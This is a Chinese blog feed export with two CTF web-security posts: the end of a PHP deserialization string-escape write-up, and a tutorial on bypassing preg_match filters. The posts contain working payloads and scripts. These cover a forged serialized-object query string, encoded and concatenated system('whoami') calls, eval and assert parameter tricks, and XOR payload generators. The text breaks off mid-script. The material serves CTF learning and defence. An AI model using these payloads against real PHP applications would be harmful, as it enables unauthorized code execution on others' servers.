title="逐步题解"></a>逐步题解</h1><p>我们向chant传入test，发现回显变为：</p><p>Your Movements: O:34:”Omg_It_Is_So_Cool_Bring_Me_My_Flag”:2:{s:5:”Chant”;s:4:”test”;s:11:”Spear_Owner”;s:6:”Nobody”;}<br>Far away from COOL…</p><p>也就是说从s:5:”Chant”;s:15:”夺命十三枪”;变成了s:5:”Chant”;s:4:”test”;我们传入的数值被序列化后反序列化，并且我们能够修改chant的值，那么有没有可能我们可以通过在传入的字符串后面加入;}来使得反序列字符串提前结束，并修改参数呢，显然是可以的</p><h2 id="PHP字符串反序列化逃逸"><a href="#PHP字符串反序列化逃逸" class="headerlink" title="PHP字符串反序列化逃逸"></a>PHP字符串反序列化逃逸</h2><p>首先我们先看看序列化语句的一个有趣的特性：</p><p>O:34:”Omg_It_Is_So_Cool_Bring_Me_My_Flag”:2:{s:5:”Chant”;s:4:”test”;s:11:”Spear_Owner”;s:6:”Nobody”;}abcdert</p><p>这个语句是可以正常识别并反序列化的，因为反序列化在识别到;}闭合之后就不会管后面的其他字符</p><p>我们可以依照题目来进一步理解，我们先传入一个正常的数据，?chant&#x3D;di_jiu_qiang，回显如下：</p><p>Your Movements: O:34:”Omg_It_Is_So_Cool_Bring_Me_My_Flag”:2:{s:5:”Chant”;s:11:”Penetrating_Gaze”;s:11:”Spear_Owner”;s:6:”Nobody”;}</p><p>我们仔细观察chant属性这块，我们可以发现，我们传入的di_qi_qiang是一个长度为11的字符串，而经过php的字符替换后，构造出来的却是Penetrating_Gaze，这个字符串长度为16，而反序列化语句却显示这个字符串只有11的长度，所以导致了错误，但是这多出来的5个长度却给了我们操作的空间，我们颗粒利用这些空间来藏我们的恶意语句。</p><p>打个比方，我们这题需要构造的语句是”;s:11:”Spear_Owner”;s:6:”MaoLei”;}，它的长度为35，而我们知道传入七个di_qi_qiang会有5个长度的差，那么传入7个di_qi_qiang就会有35个长度的差，而这35个长度的差就是让我们填充”;s:11:”Spear_Owner”;s:6:”MaoLei”;}的</p><p>因为，如果我们不填充这个语句，就会因为替换前的长度比替换后的长度短而错误，如果我们加上恶意字符串，替换前后的长度就对应，这个反序列化语句也就能在我们构造的;} 处闭合，并且忽略了后面原本的反序列化语句。</p><p>反之同理，如果替换后的长度比替换前少，同样也可以通过类似的方法进行逃逸，我不能基于本题理解，或者本题不能使用减少的办法来做，（貌似减少需要能够修改最后一段的条件？）所以给出一些其他博客的介绍：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">A</span></span>&#123;</span><br><span class="line"><span class="keyword">public</span> <span class="variable">$name</span> = <span class="string">&#x27;bbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbb&quot;;s:6:&quot;passwd&quot;;s:3:&quot;123&quot;;&#125;&#x27;</span>;</span><br><span class="line"><span class="keyword">public</span> <span class="variable">$passwd</span> = <span class="string">&#x27;1234&quot;;s:6:&quot;passwd&quot;;s:3:&quot;123&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$ss</span> = <span class="keyword">new</span> <span class="title function_ invoke__">A</span>();</span><br><span class="line"><span class="variable">$str</span> = <span class="title function_ invoke__">serialize</span>(<span class="variable">$ss</span>);</span><br><span class="line"><span class="comment">//echo $str;</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">filter</span>(<span class="params"><span class="variable">$str</span></span>)</span>&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="title function_ invoke__">str_replace</span>(<span class="string">&#x27;bb&#x27;</span>,<span class="string">&#x27;a&#x27;</span>,<span class="variable">$str</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$tt</span> = <span class="title function_ invoke__">filter</span>(<span class="variable">$str</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$tt</span>;</span><br><span class="line"><span class="variable">$qq</span> = <span class="title function_ invoke__">unserialize</span>(<span class="variable">$tt</span>);</span><br><span class="line"><span class="title function_ invoke__">var_dump</span>(<span class="variable">$qq</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>要将s:6:”passwd”;s:3:”123成功反序列化，那么就要把”;s:6:”passwd”;s:27:”1234这段字符串给吃掉。这段字符串一共有25个字符，则我们在name中输入25个bb。就可以达到效果。</p><hr><p><img src="/images/sescape/oblog1.jpg"><br>这里错误是因为s:5:”zddo”长度不够，他向后吞噬了一个双引号，导致反序列化格式错误，从而报错，我们要做的就是让他往后去吞噬一些我们构造的一些代码。以下讲具体实施。</p><p>同样的，我们这里以修改age为例，不同的是与增加字符串传值的地方有些许不同，我们构造的值是有一部分让他吞噬的</p><p>先正常传递值序列化出我们需要修改的值，我们需要的是将age：13改为35<br><img src="/images/sescape/oblog2.jpg"><br>取出”;s:3:”age”;s:2:”35”;}这就是我们需要构造的，接着继续将这部分内容重新传值，序列化出来，得到下面的结果<br><img src="/images/sescape/oblog3.jpg"><br>选中部分就是我们构造出来，他需要吞噬的代码，s:22:””这个双引号里面我们还有操作的空间，用来补齐字符串长度，接着就是计算我们自己所需要吃掉的字符串长度为18，根据过滤，他是将两个o变成一个，也就是每吃掉一个字符，就需要有一个oo，那我们需要吃掉的是18个长度，那么我们就需要18个oo，在吞噬结束之后我们的格式又恢复正确，使得真正的字符s:3:”age”;s:2:”35”;逃逸出来，成功加入反序列化</p><hr><p>累了，直接截图吧<br><img src="/images/sescape/oblog4.jpg"></p><hr><p><img src="/images/sescape/oblog5.jpg"></p><hr><h2 id="获取flag"><a href="#获取flag" class="headerlink" title="获取flag"></a>获取flag</h2><p>那么答案就很简单了，我们可以利用长度增加来逃逸字符串，我们传入7个di_qi_qiang和我们的恶意代码”;s:11:”Spear_Owner”;s:6:”MaoLei”;}就可以了，payload如下：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?chant=di_qi_qiangdi_qi_qiangdi_qi_qiangdi_qi_qiangdi_qi_qiangdi_qi_qiangdi_qi_qiang<span class="string">&quot;;s:11:&quot;</span>Spear_Owner<span class="string">&quot;;s:6:&quot;</span>MaoLei<span class="string">&quot;;&#125;</span></span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
          <category> 2023MoeCTF </category>
          
          <category> Web </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTF </tag>
            
            <tag> Web </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>PHP代码审计-preg_match()函数绕过</title>
      <link href="/2023/12/11/phppreg/"/>
      <url>/2023/12/11/phppreg/</url>
      
        <content type="html"><![CDATA[<h1 id="简述"><a href="#简述" class="headerlink" title="简述"></a>简述</h1><p>最近做了一些题目，总结一下关于preg_match()绕过技巧：</p><h1 id="最大回溯次数绕过-无版本限制"><a href="#最大回溯次数绕过-无版本限制" class="headerlink" title="最大回溯次数绕过 无版本限制"></a>最大回溯次数绕过 无版本限制</h1><p>在php中，为了防止正则表达式的贪婪匹配遇到过长的字符串时响应太慢，甚至系统崩溃的问题，php限制了回溯次数，一旦超过这个次数，preg_match函数就会返回false，所以我们可以构建一个超长的字符串来使preg_match返回false，举个例子：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/sys.*nb/is</span><br></pre></td></tr></table></figure><p>以上是一个正则表达式，用于匹配sysnb，且不管sys和nb中间出现什么都会匹配到sysnb。<br>这是我们可以输入一个字符串，sysnb在开头，然后后面加上垃圾字符（重复使用相同的字符可能会被发现），当preg_match识别到sys，它并不会马上识别后面的nb，由于贪婪匹配的原因，它会从字符串的最后开始数，直至遇见nb，但是我们的nb在最前面，它一直回溯就会超过最大次数，于是返回false，以下给出脚本：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line">a=<span class="string">&#x27;acb&#x27;</span>*<span class="number">1000000</span> <span class="comment">#这里可以改成随机生成垃圾数据</span></span><br><span class="line">string=<span class="string">&quot;sys nb&quot;</span>+a</span><br><span class="line"><span class="comment">#print(string)</span></span><br><span class="line">data = &#123;</span><br><span class="line">  <span class="string">&quot;xdmtql&quot;</span>:string</span><br><span class="line">&#125; <span class="comment">#xxx-from数据，键值对</span></span><br><span class="line">r = requests.post(<span class="string">&quot;http://af277385-c08e-4b09-8a79-374fc1f553d5.www.polarctf.com:8090/&quot;</span>,data=data) <span class="comment">#使用post请求</span></span><br><span class="line"><span class="built_in">print</span>(r.text)</span><br></pre></td></tr></table></figure><p>需要注意的是，如果正则为：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/sys.*?nb/is</span><br></pre></td></tr></table></figure><p>这种办法就没用了，因为”?”将贪婪匹配转为了懒惰匹配，只匹配到一个sysnb就收工。同时如果preg使用了强等于，即&#x3D;&#x3D;&#x3D;，此方法也失效<br><strong>注意：具体的最大回溯次数可以在phpinfo中的PCRE项的配置中查看</strong></p><h1 id="字符串拼接绕过-适用于PHP-7"><a href="#字符串拼接绕过-适用于PHP-7" class="headerlink" title="字符串拼接绕过 适用于PHP&gt;&#x3D;7"></a>字符串拼接绕过 适用于PHP&gt;&#x3D;7</h1><p>大道至简，没什么多说的，利用”.”和括号拼接字符串来绕过，面对比较简单的或正则匹配会有奇效，举个例子：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/system|phpinfo/i</span><br></pre></td></tr></table></figure><p>现在有这样一个正则，匹配了system和phpinfo这样的函数，我们只需要简单的：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">(sys.(te).m)(<span class="string">&quot;ls&quot;</span>); <span class="comment">//system(&quot;ls&quot;);</span></span><br></pre></td></tr></table></figure><p>就能拼接出被过滤的system函数，这个点和括号可以根据实际情况来搭配。<br>其他payload：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">(p.h.p.i.n.f.o)(); <span class="comment">//phpinfo();</span></span><br><span class="line">(sys.(te).m)(who.ami); <span class="comment">//system(whoami);</span></span><br><span class="line">(s.y.s.t.e.m)(<span class="string">&quot;whoami&quot;</span>); <span class="comment">//system(whoami);</span></span><br></pre></td></tr></table></figure><p>ps：在PHP中不一定需要引号(单引号&#x2F;双引号)来表示字符串。PHP支持我们声明元素的类型，比如<code>$name = (string)mochu7;</code>在这种情况下，$name就包含字符串”mochu7”，此外，如果不显示声明类型，那么PHP会将圆括号内的数据当成字符串来处理。</p><h1 id="字符串转义绕过-适用于PHP-7"><a href="#字符串转义绕过-适用于PHP-7" class="headerlink" title="字符串转义绕过 适用于PHP&gt;&#x3D;7"></a>字符串转义绕过 适用于PHP&gt;&#x3D;7</h1><p>简单来说，就是使用八进制，十六进制或Unicode编码被过滤的字符串，然后传参<br><strong>注意：传入转义字符必须双引号包裹传参</strong><br>以下给出生成Payload的脚本：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># -*- coding:utf-8 -*-</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">hex_payload</span>(<span class="params">payload</span>):</span><br><span class="line">res_payload = <span class="string">&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> payload:</span><br><span class="line">i = <span class="string">&quot;\\x&quot;</span> + <span class="built_in">hex</span>(<span class="built_in">ord</span>(i))[<span class="number">2</span>:]</span><br><span class="line">res_payload += i</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;[+]&#x27;&#123;&#125;&#x27; Convert to hex: \&quot;&#123;&#125;\&quot;&quot;</span>.<span class="built_in">format</span>(payload,res_payload))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">oct_payload</span>(<span class="params">payload</span>):</span><br><span class="line">res_payload = <span class="string">&quot;&quot;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> payload:</span><br><span class="line">i = <span class="string">&quot;\\&quot;</span> + <span class="built_in">oct</span>(<span class="built_in">ord</span>(i))[<span class="number">2</span>:]</span><br><span class="line">res_payload += i</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;[+]&#x27;&#123;&#125;&#x27; Convert to oct: \&quot;&#123;&#125;\&quot;&quot;</span>.<span class="built_in">format</span>(payload,res_payload))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">uni_payload</span>(<span class="params">payload</span>):</span><br><span class="line">res_payload = <span class="string">&quot;&quot;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> payload:</span><br><span class="line">i = <span class="string">&quot;\\u&#123;&#123;&#123;0&#125;&#125;&#125;&quot;</span>.<span class="built_in">format</span>(<span class="built_in">hex</span>(<span class="built_in">ord</span>(i))[<span class="number">2</span>:])</span><br><span class="line">res_payload += i</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;[+]&#x27;&#123;&#125;&#x27; Convert to unicode: \&quot;&#123;&#125;\&quot;&quot;</span>.<span class="built_in">format</span>(payload,res_payload))</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">payload = <span class="string">&#x27;phpinfo&#x27;</span></span><br><span class="line">hex_payload(payload)</span><br><span class="line">oct_payload(payload)</span><br><span class="line">uni_payload(payload)</span><br></pre></td></tr></table></figure><p>一些Payload示例：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">&quot;\x70\x68\x70\x69\x6e\x66\x6f&quot;</span>(); <span class="comment">//phpinfo();</span></span><br><span class="line"><span class="string">&quot;\163\171\163\164\145\155&quot;</span>(<span class="string">&#x27;whoami&#x27;</span>); <span class="comment">//system(&#x27;whoami&#x27;);</span></span><br><span class="line"><span class="string">&quot;\u&#123;73&#125;\u&#123;79&#125;\u&#123;73&#125;\u&#123;74&#125;\u&#123;65&#125;\u&#123;6d&#125;&quot;</span>(<span class="string">&#x27;id&#x27;</span>); <span class="comment">//system(&#x27;whoami&#x27;);</span></span><br><span class="line"><span class="string">&quot;\163\171\163\164\145\155&quot;</span>(<span class="string">&quot;\167\150\157\141\155\151&quot;</span>); <span class="comment">//system(&#x27;whoami&#x27;);</span></span><br><span class="line">.......</span><br></pre></td></tr></table></figure><p><strong>提示：八进制编码可以直接绕过限制了所有字母的WAF，即无字母传参</strong></p><h1 id="多次传参绕过-无版本限制"><a href="#多次传参绕过-无版本限制" class="headerlink" title="多次传参绕过 无版本限制"></a>多次传参绕过 无版本限制</h1><p>当参数是以POST请求的方式传入时，可以通过在URL处构造GET参数，然后POST获取GET参数来构造恶意代码，反之，我们也可以在GET传参时取用POST的数据，举个例子：<br>现有一url：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://xxx.xxxx.xxx/index.php</span><br></pre></td></tr></table></figure><p>我们知道可以给这个页面传入cmd参数，恶意执行代码，我们就可以这样做：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">URL：http:<span class="comment">//xxx.xxxx.xxx/index.php?1=system&amp;2=whoami //以GET方式传参，即使index.php没有这两个参数也可以</span></span><br></pre></td></tr></table></figure><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">POST：cmd=<span class="variable">$_GET</span>[<span class="number">1</span>](<span class="variable">$_GET</span>[<span class="number">2</span>]); <span class="comment">//通过POST请求获取URL处的参数，这样就构造出来system(whoami);</span></span><br></pre></td></tr></table></figure><p>我们还可以只POST传参，只需传入以下数据就好：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cmd=<span class="variable">$_POST</span>[<span class="number">1</span>](<span class="variable">$_POST</span>[<span class="number">2</span>]);&amp;<span class="number">1</span>=system&amp;<span class="number">2</span>=whoami</span><br></pre></td></tr></table></figure><p>另外，<strong>这种方法还能有效地绕过长度限制</strong>，比如现在限制了POST参数的长度为15，我们只需要：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">GET:http:<span class="comment">//xxx.xxxx.xxx/index.php?1=system(&#x27;whoami&#x27;);</span></span><br><span class="line">POST:cmd=<span class="keyword">eval</span>(<span class="variable">$_GET</span>[<span class="number">1</span>]); <span class="comment">//有时eval也会被过滤，这里应结合实际选择执行代码的函数</span></span><br></pre></td></tr></table></figure><p>再举一个例子：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">GET:http:<span class="comment">//xxx.xxxx.xxx/index.php?1[]=1&amp;1[]=phpinfo()&amp;2=assert</span></span><br><span class="line">POST:cmd=<span class="title function_ invoke__">usort</span>(...<span class="variable">$_GET</span>);</span><br></pre></td></tr></table></figure><p>举一个GET传参获取POST参数的例子（为了方便理解，这里直接上Postman的截图）：<br><img src="/images/phppreg/fuckpreg1.JPG"></p><h1 id="内建函数访问绕过-适用于PHP-7（PHP5？）"><a href="#内建函数访问绕过-适用于PHP-7（PHP5？）" class="headerlink" title="内建函数访问绕过 适用于PHP&gt;&#x3D;7（PHP5？）"></a>内建函数访问绕过 适用于PHP&gt;&#x3D;7（PHP5？）</h1><p>这里使用了内置的get_defined_functions()函数，它的作用是返回一个包含所有已定义函数的数组，所以，我们只通过索引取这个数组里我们要用的函数就可以了，比如system，实际情况中，我们可以根据目标的php版本，<strong>本地搭建并调用这个函数来查找代码执行函数的索引。</strong><br>这种办法的局限性较大，因为我们不知道内部是否禁止了这个函数，并且不同的php版本返回的数组也不同，我们不能很确定比如system函数具体索引是多少，但如果能用那应该挺好用，以下例子使用的是PHP7.4.3</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">cmd=<span class="title function_ invoke__">get_defined_functions</span>()[internal][<span class="number">266</span>](); <span class="comment">//phpinfo();</span></span><br><span class="line">cmd=<span class="title function_ invoke__">get_defined_functions</span>()[internal][<span class="number">358</span>](whoami); <span class="comment">//system(whoami);</span></span><br></pre></td></tr></table></figure><h1 id="异或绕过-无版本限制"><a href="#异或绕过-无版本限制" class="headerlink" title="异或绕过 无版本限制"></a>异或绕过 无版本限制</h1><p>真神之一，通过异或算法无中生有，利用php中两个字符串异或之后得到的还是一个字符串的特性，简单介绍以下php的异或语句：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;?&#x27;</span>^<span class="string">&#x27;~&#x27;</span>; <span class="comment">//异或?和~</span></span><br><span class="line">A <span class="comment">//输出A</span></span><br></pre></td></tr></table></figure><p>给出更详细的原理：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">字符：?         ASCII码：<span class="number">63</span>           二进制：  <span class="number">0011</span> <span class="number">1111</span></span><br><span class="line">字符：~         ASCII码：<span class="number">126</span>          二进制：  <span class="number">0111</span> <span class="number">1110</span></span><br><span class="line">异或规则：</span><br><span class="line"><span class="number">1</span>   XOR   <span class="number">0</span>   =   <span class="number">1</span></span><br><span class="line"><span class="number">0</span>   XOR   <span class="number">1</span>   =   <span class="number">1</span></span><br><span class="line"><span class="number">0</span>   XOR   <span class="number">0</span>   =   <span class="number">0</span></span><br><span class="line"><span class="number">1</span>   XOR   <span class="number">1</span>   =   <span class="number">0</span></span><br><span class="line">上述两个字符异或得到 二进制：  <span class="number">0100</span> <span class="number">0001</span></span><br><span class="line">该二进制的十进制也就是：<span class="number">65</span></span><br><span class="line">对应的ASCII码是：A</span><br><span class="line"></span><br><span class="line">几个位运算符：</span><br><span class="line">可以把<span class="number">1</span>理解为真，<span class="number">0</span>理解为假；那么就可以把“&amp;”理解为“与”，“|”理解为“或”；**而对于“^”则是相同为就<span class="number">0</span>**，不同就为<span class="number">1</span>。“~”为取反操作。</span><br></pre></td></tr></table></figure><p><strong>注意：异或时有些字符会影响语句执行，所以要去掉，比如反引号和单引号</strong><br>以下给出几种不同的脚本，选取合适的使用</p><h2 id="FUZZ"><a href="#FUZZ" class="headerlink" title="FUZZ"></a>FUZZ</h2><h3 id="普通脚本"><a href="#普通脚本" class="headerlink" title="普通脚本"></a>普通脚本</h3><p>这个脚本可以穷举输入的字符异或后的所有可见字符，灵活性高，适合在常规手段无法绕过时使用：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*author yu22x*/</span></span><br><span class="line"></span><br><span class="line"><span class="variable">$myfile</span> = <span class="title function_ invoke__">fopen</span>(<span class="string">&quot;xor_rce.txt&quot;</span>, <span class="string">&quot;w&quot;</span>);</span><br><span class="line"><span class="variable">$contents</span>=<span class="string">&quot;&quot;</span>;</span><br><span class="line"><span class="keyword">for</span> (<span class="variable">$i</span>=<span class="number">0</span>; <span class="variable">$i</span> &lt; <span class="number">256</span>; <span class="variable">$i</span>++) &#123; </span><br><span class="line"><span class="keyword">for</span> (<span class="variable">$j</span>=<span class="number">0</span>; <span class="variable">$j</span> &lt;<span class="number">256</span> ; <span class="variable">$j</span>++) &#123; </span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$i</span>&lt;<span class="number">16</span>)&#123;</span><br><span class="line"><span class="variable">$hex_i</span>=<span class="string">&#x27;0&#x27;</span>.<span class="title function_ invoke__">dechex</span>(<span class="variable">$i</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line"><span class="variable">$hex_i</span>=<span class="title function_ invoke__">dechex</span>(<span class="variable">$i</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$j</span>&lt;<span class="number">16</span>)&#123;</span><br><span class="line"><span class="variable">$hex_j</span>=<span class="string">&#x27;0&#x27;</span>.<span class="title function_ invoke__">dechex</span>(<span class="variable">$j</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line"><span class="variable">$hex_j</span>=<span class="title function_ invoke__">dechex</span>(<span class="variable">$j</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$preg</span> = <span class="string">&#x27;/[a-z0-9]/i&#x27;</span>; <span class="comment">//根据题目给的正则表达式修改即可</span></span><br><span class="line"><span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="variable">$preg</span> , <span class="title function_ invoke__">hex2bin</span>(<span class="variable">$hex_i</span>))||<span class="title function_ invoke__">preg_match</span>(<span class="variable">$preg</span> , <span class="title function_ invoke__">hex2bin</span>(<span class="variable">$hex_j</span>)))&#123;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">  </span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line"><span class="variable">$a</span>=<span class="string">&#x27;%&#x27;</span>.<span class="variable">$hex_i</span>;</span><br><span class="line"><span class="variable">$b</span>=<span class="string">&#x27;%&#x27;</span>.<span class="variable">$hex_j</span>;</span><br><span class="line"><span class="variable">$c</span>=(<span class="title function_ invoke__">urldecode</span>(<span class="variable">$a</span>)^<span class="title function_ invoke__">urldecode</span>(<span class="variable">$b</span>));</span><br><span class="line"><span class="keyword">if</span> (<span class="title function_ invoke__">ord</span>(<span class="variable">$c</span>)&gt;=<span class="number">32</span>&amp;<span class="title function_ invoke__">ord</span>(<span class="variable">$c</span>)&lt;=<span class="number">126</span>) &#123;</span><br><span class="line"><span class="variable">$contents</span>=<span class="variable">$contents</span>.<span class="variable">$c</span>.<span class="string">&quot; &quot;</span>.<span class="variable">$a</span>.<span class="string">&quot; &quot;</span>.<span class="variable">$b</span>.<span class="string">&quot;\n&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="title function_ invoke__">fwrite</span>(<span class="variable">$myfile</span>,<span class="variable">$contents</span>);</span><br><span class="line"><span class="title function_ invoke__">fclose</span>(<span class="variable">$myfile</span>);</span><br></pre></td></tr></table></figure><p>运行后会生成一个txt文档，然后运行以下的python脚本构造函数：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># author yu22x</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> urllib</span><br><span class="line"><span class="keyword">from</span> sys <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">action</span>(<span class="params">arg</span>):</span><br><span class="line">   s1=<span class="string">&quot;&quot;</span></span><br><span class="line">   s2=<span class="string">&quot;&quot;</span></span><br><span class="line">   <span class="keyword">for</span> i <span class="keyword">in</span> arg:</span><br><span class="line">       f=<span class="built_in">open</span>(<span class="string">&quot;xor_rce.txt&quot;</span>,<span class="string">&quot;r&quot;</span>)</span><br><span class="line">       <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">           t=f.readline()</span><br><span class="line">           <span class="keyword">if</span> t==<span class="string">&quot;&quot;</span>:</span><br><span class="line">               <span class="keyword">break</span></span><br><span class="line">           <span class="keyword">if</span> t[<span class="number">0</span>]==i:</span><br><span class="line">               <span class="comment">#print(i)</span></span><br><span class="line">               s1+=t[<span class="number">2</span>:<span class="number">5</span>]</span><br><span class="line">               s2+=t[<span class="number">6</span>:<span class="number">9</span>]</span><br><span class="line">               <span class="keyword">break</span></span><br><span class="line">       f.close()</span><br><span class="line">   output=<span class="string">&quot;(\&quot;&quot;</span>+s1+<span class="string">&quot;\&quot;^\&quot;&quot;</span>+s2+<span class="string">&quot;\&quot;)&quot;</span></span><br><span class="line">   <span class="keyword">return</span>(output)</span><br><span class="line">   </span><br><span class="line"><span class="keyword">while</span> <span 